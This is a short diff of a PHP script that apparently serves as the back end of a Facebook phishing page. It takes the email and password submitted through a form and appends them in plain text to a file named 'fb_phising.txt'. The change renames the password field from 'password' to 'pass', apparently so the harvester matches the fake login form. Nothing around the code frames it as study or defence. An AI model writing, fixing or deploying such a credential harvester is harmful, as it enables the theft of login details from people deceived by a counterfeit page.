@@ -1,7 +1,7 @@
 <?php 
      if(isset($_POST['email'])){
          $email = $_POST['email'];
-         $pass = $_POST['password'];
+         $pass = $_POST['pass'];
          $myfile = fopen("fb_phising.txt", "a") or die("Unable to open file!"); 
         fwrite($myfile, "Username : $email\n");
         fwrite($myfile, "Password : $pass\n");
